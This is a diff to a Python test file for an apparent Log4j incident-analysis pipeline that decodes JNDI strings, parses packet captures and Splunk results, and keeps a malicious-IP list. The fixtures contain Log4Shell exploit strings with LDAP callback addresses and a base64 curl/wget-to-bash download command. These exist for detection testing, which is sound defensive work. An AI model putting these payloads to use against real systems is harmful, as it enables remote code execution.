@@ -66,6 +66,36 @@ def test_normalize_nested_obfuscation():
     assert "ldap" in result or "LDAP" in result
 
 
+def test_normalize_real_base64_payload():
+    payload = "KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g="
+    result = normalize_jndi_payload(payload)
+    assert result == payload
+
+
+def test_normalize_pdf_jndi_with_obfuscation():
+    payload = "${${lower:j}ndi:${lower:l}dap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"
+    result = normalize_jndi_payload(payload)
+    assert "jndi:ldap://195.54.160.149" in result
+    assert "${lower:" not in result
+    assert "${::-" not in result
+
+
+def test_normalize_pdf_nested_lower_resolves():
+    payload = "${${lower:l}dap://121.140.99.236:1389/Exploit}"
+    result = normalize_jndi_payload(payload)
+    assert "ldap://121.140.99.236:1389/Exploit" in result
+
+
+def test_normalize_pdf_known_malicious_ips_match():
+    assert "195.54.160.149" in ma.KNOWN_MALICIOUS_IPS
+    assert "198.71.247.91" in ma.KNOWN_MALICIOUS_IPS
+    assert "175.6.210.66" in ma.KNOWN_MALICIOUS_IPS
+    assert "191.232.38.25" in ma.KNOWN_MALICIOUS_IPS
+    assert "107.189.1.178" in ma.KNOWN_MALICIOUS_IPS
+    assert "147.182.202.30" in ma.KNOWN_MALICIOUS_IPS
+    assert "191.71.247.91" not in ma.KNOWN_MALICIOUS_IPS
+
+
 # ----- _parse_tshark_field_output -----
 
 def test_parse_tshark_json_empty():
@@ -115,6 +145,41 @@ def test_tool_query_splunk_empty():
     )
     result = tool_query_splunk('search index=* "jndi"')
     assert "0 events found" in result
+
+
+@responses.activate
+def test_tool_query_splunk_with_pdf_fixture():
+    import json, os
+    fixture_path = os.path.join(os.path.dirname(__file__), "fixtures", "pdf_splunk_results.json")
+    with open(fixture_path) as f:
+        pdf_data = json.load(f)
+    responses.add(
+        responses.POST,
+        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
+        json={"results": pdf_data[:5]},
+        status=200,
+    )
+    result = tool_query_splunk('search index=* "jndi"')
+    assert "TIME RANGE" in result
+    assert "195.54.160.149" in result
+    assert "Jul" in result or "2026" in result
+
+
+@responses.activate
+def test_tool_query_splunk_pdf_full_timeline():
+    import json, os
+    fixture_path = os.path.join(os.path.dirname(__file__), "fixtures", "pdf_splunk_results.json")
+    with open(fixture_path) as f:
+        pdf_data = json.load(f)
+    responses.add(
+        responses.POST,
+        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
+        json={"results": pdf_data},
+        status=200,
+    )
+    result = tool_query_splunk('search index=* "jndi" | stats count by src_ip')
+    assert "TIME RANGE" in result
+    assert "2026-07-24" in result or "Jul 24" in result or "07-24" in result
 
 
 @responses.activate
@@ -217,6 +282,65 @@ def test_tool_analyze_pcap_tshark_error(mock_run):
     with patch("os.path.exists", return_value=True):
         result = tool_analyze_pcap("test.pcap")
     assert "PCAP_ERROR" in result
+
+
+@patch("multi_agent.subprocess.run")
+def test_tool_analyze_pcap_pdf_pcapA(mock_run, pdf_tshark_pcapA_json):
+    dns_fixture = json.dumps([
+        {"_source": {"layers": {
+            "frame": {"frame.number": ["6"], "frame.time": ["Jul 24, 2026 22:48:40.000 UTC"]},
+            "ip": {"ip.src": ["195.54.160.149"], "ip.dst": ["121.140.99.236"]},
+            "dns": {"dns.qry.name": ["evil-callback.com"], "dns.flags.response": ["0"]},
+        }}}
+    ])
+    mock_run.side_effect = [
+        MagicMock(returncode=0, stdout=pdf_tshark_pcapA_json, stderr=""),
+        MagicMock(returncode=0, stdout=dns_fixture, stderr=""),
+    ]
+    with patch("os.path.exists", return_value=True):
+        result = tool_analyze_pcap("pcapA.json")
+    assert "PCAP TIMELINE SUMMARY" in result
+    assert "195.54.160.149" in result
+    assert "175.6.210.66" in result
+    assert "CRITICAL: Log4j JNDI Exploit String" in result
+    assert "121.140.99.236" in result
+    assert "curl/7.68.0" in result
+
+
+@patch("multi_agent.subprocess.run")
+def test_tool_analyze_pcap_pdf_pcapB(mock_run, pdf_tshark_pcapB_json):
+    dns_fixture = json.dumps([
+        {"_source": {"layers": {
+            "frame": {"frame.number": ["20"], "frame.time": ["Jul 24, 2026 22:49:00.000 UTC"]},
+            "ip": {"ip.src": ["104.248.144.120"], "ip.dst": ["31.131.16.127"]},
+            "dns": {"dns.qry.name": ["callbacks.evil.com"], "dns.flags.response": ["0"]},
+        }}}
+    ])
+    mock_run.side_effect = [
+        MagicMock(returncode=0, stdout=pdf_tshark_pcapB_json, stderr=""),
+        MagicMock(returncode=0, stdout=dns_fixture, stderr=""),
+    ]
+    with patch("os.path.exists", return_value=True):
+        result = tool_analyze_pcap("pcapB.json")
+    assert "PCAP TIMELINE SUMMARY" in result
+    assert "104.248.144.120" in result
+    assert "46.105.95.220" in result
+    assert "5.157.38.50" in result
+    assert "198.71.247.91" in result
+    assert "OUTBOUND JNDI" in result.upper() or "LDAP" in result.upper()
+    assert "Suspicious UA" in result or "suspicious" in result.lower()
+    assert "1389" in result
+
+
+@patch("multi_agent.subprocess.run")
+def test_tool_analyze_pcap_pdf_known_malicious(mock_run, pdf_tshark_pcapB_json):
+    mock_run.side_effect = [
+        MagicMock(returncode=0, stdout=pdf_tshark_pcapB_json, stderr=""),
+        MagicMock(returncode=0, stdout="[]", stderr=""),
+    ]
+    with patch("os.path.exists", return_value=True):
+        result = tool_analyze_pcap("pcapB.json")
+    assert "Known Malicious IP" in result or "198.71.247.91" in result
 
 
 # ----- PipelineTelemetry -----
@@ -372,6 +496,29 @@ def test_tool_syft_sbom_error(mock_run):
     mock_run.return_value = MagicMock(returncode=1, stderr="syft: error")
     result = tool_syft_sbom()
     assert "VULN_ERROR" in result
+
+
+# ----- Pipeline config validation using PDF reference data -----
+
+def test_pipeline_config_matches_pdf_data(pdf_reference_data):
+    ref = pdf_reference_data
+    missing_ips = [ip for ip in ref["known_malicious_ips"] if ip not in ma.KNOWN_MALICIOUS_IPS]
+    assert not missing_ips, f"KNOWN_MALICIOUS_IPS missing: {missing_ips}"
+
+    for cb in ref["callback_endpoints"]:
+        endpoint = cb["endpoint"]
+        ip_part = endpoint.split(":")[0]
+        assert ip_part in ma.KNOWN_MALICIOUS_IPS or "." in ip_part, f"Callback IP {ip_part} not tracked"
+
+
+def test_pipeline_pcap_dirs_configured():
+    assert ma.CONFIG["PCAP_DIRECTORY"], "PCAP_DIRECTORY must be set"
+    assert ma.CONFIG["REQUIRED_PCAPS"], "REQUIRED_PCAPS must not be empty"
+
+
+def test_pipeline_ollama_configured():
+    assert ma.CONFIG["OLLAMA_HOST"], "OLLAMA_HOST must be set"
+    assert ma.CONFIG["LLM_MODEL"], "LLM_MODEL must be set"
 
 
 # ----- retry_request -----
